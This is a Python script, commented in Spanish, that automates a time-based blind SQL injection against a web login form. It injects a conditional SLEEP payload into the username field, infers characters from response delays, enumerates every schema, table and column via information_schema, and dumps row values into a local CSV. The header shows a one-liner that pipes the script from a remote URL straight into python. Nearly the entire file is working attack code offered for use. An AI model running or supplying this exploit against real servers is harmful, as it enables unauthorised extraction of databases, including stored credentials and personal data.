#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para Dumpear las bases de datos de un servidor web atacando el formulario de login con la vulnerabilidad time based blind
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConVulnTimeBasedBlind.py | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/SQLi/LoginForm-DumpearBasesDeDatos-ConVulnTimeBasedBlind.py | nano -
#
# Requisitos: # python3 -m pip install --user x --break-system-packages
#
# ----------

import requests
import argparse
import csv
import time
from urllib.parse import urlparse

# Argumentos
parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="URL del formulario vulnerable")
parser.add_argument("--max", type=int, default=10, help="Máximo de elementos por nivel")
parser.add_argument("--delay", type=int, default=3, help="Retraso en segundos para inferencia ciega")
parser.add_argument("--userfield", required=True, help="Nombre del campo de usuario")
parser.add_argument("--passfield", required=True, help="Nombre del campo de contraseña")
args = parser.parse_args()

# Variables
url         = args.url
max_enum    = args.max
delay       = args.delay
user_field  = args.userfield
pass_field  = args.passfield

# Función de comprobación
def is_true(condition):
  payload = f"' AND IF({condition}, SLEEP({delay}), 0) -- -"
  data = {user_field: payload, pass_field: "x"}
  t0 = time.time()
  requests.post(url, data=data)
  return time.time() - t0 > delay - 0.5

# Extracción carácter a carácter
def extract_char(query, pos):
  for c in range(32, 127):
    if is_true(f"ASCII(SUBSTRING(({query}),{pos},1))={c}"):
      return chr(c)
  return None

# Extracción de string completo
def extract_string(query, max_len=40):
  out = ""
  for pos in range(1, max_len + 1):
    ch = extract_char(query, pos)
    if ch is None:
      break
    out += ch
  return out

# Inicialización CSV
host = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{host}.csv"
csvf = open(csv_file, "w", newline="", encoding="utf-8")
csvw = csv.writer(csvf)
csvw.writerow(["Database", "Table", "Column", "RowIndex", "Value"])

# Enumeración de bases de datos, tablas, columnas y filas
for db_i in range(max_enum):
  db = extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db: break
  print(f"\n[DB] {db}")
  for tb_i in range(max_enum):
    table = extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table: break
    print(f"  [TABLE] {table}")
    cols = []
    for col_i in range(max_enum):
      col = extract_string(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {col_i},1")
      if not col: break
      print(f"    [COL] {col}")
      cols.append(col)
    for row_i in range(max_enum):
      found = False
      for col in cols:
        val = extract_string(f"SELECT {col} FROM {db}.{table} LIMIT {row_i},1")
        if val:
          print(f"      [row {row_i}] {col}: {val}")
          csvw.writerow([db, table, col, row_i, val])
          found = True
      if not found:
        break

csvf.close()
print(f"\nCSV guardado en {csv_file}")

